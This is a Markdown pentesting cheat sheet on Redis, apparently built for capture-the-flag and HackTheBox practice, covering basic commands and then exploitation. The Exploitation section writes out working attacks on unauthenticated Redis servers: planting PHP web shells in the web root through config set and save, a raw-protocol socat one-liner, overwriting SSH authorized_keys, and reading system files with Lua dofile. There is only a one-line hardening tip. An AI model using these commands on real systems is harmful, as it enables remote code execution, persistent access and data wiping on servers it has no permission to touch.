# Redis
## Introduction to Redis

- Key value pair database
- (nil) mean does not exist

## Connecting
```bash
redis-cli -h $IP -p $port -a $password -n $databasenumber
```

## Concepts
```sql
info 	-- server info
CONFIG GET * --  list of all active configuration variables you can change

```
Keyspace section is the main dictionary of each database

## Useful Commands
```sql
select $database/$table
keys * # all keys
get $keyname

# CMD KEY
config get * # retrieve current configuration of the database
config get dir # windows directory command

get user	
set user


```

[flushall](https://redis.io/commands/flushall/)
```bash
# Delete all the keys of all the existing databases, not just the currently selected one. This command never fails.
flushall [ASYNC | SYNC]
```

## Exploitation


[ChrisPritchard/ctf-writeups TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md) provides a nice explanation for my very sparse notes below: *"if you have access to redis (port 6379) and a handy reachable location (e.g. if you know a user and have port 22, or a website you know or can guess the dir of), the following technique (from one of redis' authors!) can work:"* [https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt](https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt)

continued from [ChrisPritchard/ctf-writeups TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md):
>For the latter method, a website, the following are the steps:
>1. install the `redis-cli` on your attacking machine. `sudo apt install redis-tools`
>2. connect to the server: `redis-cli -h 10.10.10.10.`
>3. run the following commands to set and save the database:
```
config set dir /var/www/html
config set dbfilename "shell.php"
set 1 "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"
save
```
>- all going well, navigate to /shell.php?e=id on the webserver and see if the username has shown up
>- because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to `?e=`


```sql
eval dofile('/etc/passwd') 0 # enumerating files, with lua script dofile()
eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0 # enumerating files, with lua script dofile()
```

[Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  
```bash
$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
$ redis-cli -h 192.168.1.11
192.168.1.11:6379> config set dir /Users/antirez/.ssh/
OK
192.168.1.11:6379> config get di
1) "dir"
2) "/Users/antirez/.ssh"
3) 192.168.1.11:6379> config set dbfilename "authorized_keys"
4) OK
5) 192.168.1.11:6379> save
6) OK
```

[0xdf variation for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) - White space required!
```bash
# 0xDF 
# cmd.php:




 <? system($_REQUEST['cmd']); ?>




# 0xdfreddishRCE.sh
#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 127.0.0.1 flushall
cat cmd.php | redis-cli -x set subscribetoippsecandread0xdf
redis-cli -h 127.0.0.1 config set dir /var/www/html/
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
redis-cli -h 127.0.0.1 save
```

[alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www) prefers *to talk raw Redis. Have a look here [https://www.compose.com/articles/how-to-talk-raw-redis/](https://www.compose.com/articles/how-to-talk-raw-redis/) and here [https://redis.io/topics/protocol](https://redis.io/topics/protocol). So, basically, we can do something like this:*
```bash
echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php shell_exec($_GET["e"]); ?>\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\nz.php\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$46\r\n/var/www/html/8924d0549008565c554f8128cd11fda4\r\n*1\r\n$4\r\nSAVE\r\n' | /tmp/socat - TCP:redis:6379
```

## Hardening

[Redis force Authentication](https://redis.io/docs/management/security/#authentication)
```bash
sudo sed -i 's/# requirepass/requirepass/g' /etc/redis/redis.conf
```
## References

[Redis Commands](https://redis.io/commands/)
[Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
[Lzone](https://lzone.de/cheat-sheet/Redis)
[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
[alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www)
[Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  
[0xdf Writeup for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) 
[Redis force Authentication](https://redis.io/docs/management/security/#authentication)